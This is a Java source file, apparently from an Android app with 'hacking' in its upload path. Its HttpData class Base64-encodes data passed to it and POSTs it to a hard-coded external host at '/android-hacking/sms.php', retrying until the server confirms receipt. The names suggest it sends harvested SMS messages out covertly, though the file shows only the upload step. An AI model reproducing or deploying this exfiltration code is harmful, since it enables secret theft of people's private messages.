package com.ahv.allakumarreddy.andro1message;


import android.util.Base64;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLEncoder;

/**
 * Created by alla.kumarreddy on 5/13/2017.
 */

public class HttpData {

    private String url = "https://fwapps.000webhostapp.com/android-hacking/sms.php";
    private String dataSent;


    public HttpData(String dataSent) {
        this.dataSent = Base64.encodeToString(dataSent.toString().getBytes(), Base64.DEFAULT);
        this.post(this.send());
    }

    private void post(String response) {
        if (response != null) {
            //SUCCESS
            new ErrorCus("Http data  : " + response);
            while (true) {
                if (response.trim().compareToIgnoreCase("1") == 0)
                    return;
                else
                    this.post(this.send());
            }
        } else {
            //NO SUCCESS
            new ErrorCus("Http data : error!");
        }
    }

    private void publishProgress(String... text) {
        new ErrorCus("Http data : " + text[0]);
    }

    public String send() {

        try {
            URL url = new URL(this.url);
            HttpURLConnection con = (HttpURLConnection) url.openConnection();
            //SET PROPERTIES
            con.setRequestMethod("POST");
            con.setConnectTimeout(100000);
            con.setReadTimeout(100000);
            con.setDoInput(true);
            con.setDoOutput(true);
            //RETURN
            if (con == null) {
                return null;
            }

            try {
                OutputStream os = con.getOutputStream();
                //WRITE
                BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(os, "UTF-8"));
                String data = URLEncoder.encode("data", "UTF-8") + "=" +
                        URLEncoder.encode(this.dataSent, "UTF-8");
                bw.write(data);
                bw.flush();
                //RELEASE RES
                bw.close();
                os.close();
                //HAS IT BEEN SUCCESSFUL?
                int responseCode = con.getResponseCode();
                if (responseCode == con.HTTP_OK) {
                    //GET EXACT RESPONSE
                    BufferedReader br = new BufferedReader(new InputStreamReader(con.getInputStream()));
                    StringBuffer response = new StringBuffer();
                    String line;
                    //READ LINE BY LINE
                    while ((line = br.readLine()) != null) {
                        response.append(line);
                    }
                    //RELEASE RES
                    br.close();
                    return response.toString();
                } else {
                    publishProgress("response code is not ok");
                }
            } catch (IOException e) {
                publishProgress(e.getMessage());
            }
            return null;
        } catch (MalformedURLException e) {
            publishProgress(e.getMessage());
        } catch (IOException e) {
            publishProgress(e.getMessage());
        }
        return null;
    }

}
